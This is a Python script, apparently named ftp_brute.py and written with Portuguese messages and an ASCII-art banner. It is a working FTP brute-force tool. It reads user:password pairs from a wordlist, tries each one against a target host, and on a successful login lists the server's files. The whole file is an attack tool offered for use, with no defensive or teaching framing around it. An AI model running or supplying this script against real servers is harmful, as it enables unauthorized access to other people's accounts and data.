from ftplib import FTP
import sys


print()

def banner():
        print("""██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗ ██████╗ ██████╗  ██████╗███████╗    ███████╗████████╗██████╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝    ██╔════╝╚══██╔══╝██╔══██╗
██████╔╝██████╔╝██║   ██║   ██║   █████╗  █████╗  ██║   ██║██████╔╝██║     █████╗      █████╗     ██║   ██████╔╝
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝      ██╔══╝     ██║   ██╔═══╝
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗    ██║        ██║   ██║
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝    ╚═╝        ╚═╝   ╚═╝""")
banner()


print()


def tentar_login(host, usuario, senha):
    try:
        ftp = FTP(host, timeout=5)
        ftp.login(usuario, senha)
        print(f"[+] SUCESSO: {usuario}:{senha}")
        ftp.retrlines('LIST')  # Lista os arquivos
        ftp.quit()
        return True
    except:
        print(f"[-] Falha: {usuario}:{senha}")
        return False

def bruteforce_ftp(host, wordlist_path):
    try:
        with open(wordlist_path, 'r') as arquivo:
            for linha in arquivo:
                linha = linha.strip()
                if ':' in linha:
                    usuario, senha = linha.split(':', 1)
                    if tentar_login(host, usuario, senha):
                        print("[*] Login bem-sucedido. Encerrando bruteforce.")
                        break
    except FileNotFoundError:
        print(f"[-] Wordlist não encontrada: {wordlist_path}")
    except Exception as e:
        print(f"[-] Erro: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Uso: python3 ftp_brute.py <host> <wordlist.txt>")
        sys.exit(1)

    alvo = sys.argv[1]
    wordlist = sys.argv[2]
    bruteforce_ftp(alvo, wordlist)
